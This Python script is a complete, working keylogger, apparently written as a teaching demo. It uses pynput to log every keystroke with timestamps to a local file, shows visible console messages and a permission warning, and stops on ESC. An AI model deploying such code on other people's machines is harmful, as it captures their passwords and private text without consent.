from pynput import keyboard
from datetime import datetime
import os

# Configuration
LOG_FILE = "keylog.txt"


def get_timestamp():
    """Returns current timestamp for logging."""
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def on_press(key):
    """Callback function when a key is pressed."""
    try:
        # Log alphanumeric keys
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            timestamp = get_timestamp()
            f.write(f"[{timestamp}] Key pressed: {key.char}\n")
        print(f"Key pressed: {key.char}")
        
    except AttributeError:
        # Log special keys (space, enter, shift, etc.)
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            timestamp = get_timestamp()
            key_name = str(key).replace("Key.", "")
            f.write(f"[{timestamp}] Special key pressed: {key_name}\n")
        print(f"Special key pressed: {key}")


def on_release(key):
    """Callback function when a key is released."""
    # Stop listener when Escape key is pressed
    if key == keyboard.Key.esc:
        print("\n[!] Escape key pressed. Stopping keylogger...")
        print(f"[+] Logs saved to: {os.path.abspath(LOG_FILE)}")
        return False


def main():
    """Main function to start the keylogger."""
    print("=" * 60)
    print("       SIMPLE KEYLOGGER - EDUCATIONAL PURPOSE ONLY")
    print("=" * 60)
    print("\n[!] IMPORTANT: Ensure you have permission to run this program!")
    print(f"[+] Logging keystrokes to: {os.path.abspath(LOG_FILE)}")
    print("[+] Press ESC to stop the keylogger\n")
    print("Starting in 3 seconds... (Press Ctrl+C to cancel)")
    
    import time
    time.sleep(3)
    
    # Create/append to log file with header
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"\n{'='*50}\n")
        f.write(f"Keylogger Session Started: {get_timestamp()}\n")
        f.write(f"{'='*50}\n\n")
    
    # Start listening to keyboard events
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    
    print("\n[+] Keylogger stopped successfully!")
    print(f"[+] Check {LOG_FILE} for logged keystrokes.")


if __name__ == "__main__":
    main()